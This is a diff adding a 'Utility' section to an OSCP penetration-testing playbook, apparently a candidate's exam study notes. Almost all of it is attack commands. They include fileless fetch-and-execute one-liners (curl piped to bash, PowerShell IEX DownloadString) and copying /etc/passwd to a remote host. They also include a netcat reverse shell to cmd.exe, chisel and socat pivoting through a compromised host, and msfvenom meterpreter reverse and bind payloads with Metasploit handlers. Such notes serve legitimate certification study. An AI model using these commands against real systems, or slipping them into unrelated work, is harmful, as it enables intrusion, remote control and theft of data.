@@ -1,6 +1,10 @@
 # OSCP PlayBook
 
 ## Table of Contents
+- [Utility](#utility)
+    -[File Transfer](#file-transfer)
+    -[Pivot](#pivot)
+    -[Upgrade Shell](#upgrade-shell)
 - [Recon](#recon)
     - [Nmap](#nmap)
     - [Services](#services)
@@ -19,6 +23,82 @@
         - [Linux](#linux-exploit)
         - [Windows](#windows-exploit)
 - [Active Directory](#active-directory)
+
+## Utility
+#### File Transfer
+```c
+#Linux
+    ##Upload
+        python3 -m http.server
+        python2.7 -m SimpleHTTPServer
+        php -S 0.0.0.0:8000
+        scp /etc/passwd User@IP:/home/User/
+    ##Download
+        wget http://IP/file.txt -O /Downloads
+        curl -o /Downloads url.com/file.txt
+        scp User@IP:/root/myroot.txt .
+        ###Fileless
+            curl url.com/file.sh | bash
+            wget -q0- url.com/file.py | python3
+
+#Windows
+    ##PS1
+        ###Upload
+            IEX(New-Object Net.WebClient).DownloadString('file url')
+            Invoke-FileUpload -Uri http://Local IP:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+        ###Download
+            (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+            Invoke-WebRequest target file url -OutFile PowerView.ps1
+            ####File less
+                IEX (New-Object Net.WebClient).DownloadString('Target File Url')
+                (New-Object Net.WebClient).DownloadString('Target File URL') | IEX
+
+    ##CMD
+        ###Upload
+        ###Download
+            certutil -urlcache -f -split http://IP/file.txt
+```
+
+#### Pivot
+```c
+A <-> B <-> C
+#Chisel - Must have a shell on B
+    On A: cd /opt/priv_esc_windows/ -> sudo python3 -m http.server 80
+    On B cmd: certutil -urlcache -split -f http://A_IP/nc.exe
+    On A: nc -lvnp 4444
+    On B: nc A_IP 4444 -e cmd.exe
+        This creates reverse shell
+    On A: Download [chisel](https://github.com/jpillora/chisel/releases) then upload it to B
+    On A: ./chisel server -p 8000 --reverse
+    On B: chisel A_IP:8000 R:socks   -> looking for it to say connected
+    On A: edit /etc/proxychains.conf -> last line: socks5 127.0.0.1 1080
+    On A: proxychains COMMAND  ->  now we can run commands against C
+
+#Socat - Must have a shell on B
+    ##Reverse
+        On B: socat TCP4-LISTEN:8080,fork TCP4:A_IP:PORT
+        Craft payload: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=B_IP -f exe -o backupscript.exe LPORT=8080
+        Upload to B then to A
+        On A: msf: use exploit/multi/handler -> set payload windows/x64/meterpreter/reverse_https, set lhost 0.0.0.0, port PORT, run
+    ##Bind shell
+        Craft payload: msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
+        Get payload on B
+        On B, start bind listener: socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+        On A: msf -> use exploit/multi/handler -> set payload windows/x64/meterpreter/bind_tcp, set RHOST B_IP, set LPORT 8080
+
+```
+
+#### Upgrade Shell
+```c
+#Python
+    which python
+        python -c 'import pty; pty.spawn("/bin/bash")'
+    which python3
+        python3 -c 'import pty; pty.spawn("/bin/bash")'
+#Bin
+    /bin/sh -i
+    /bin/bash -i
+```
 
 ## Recon
 
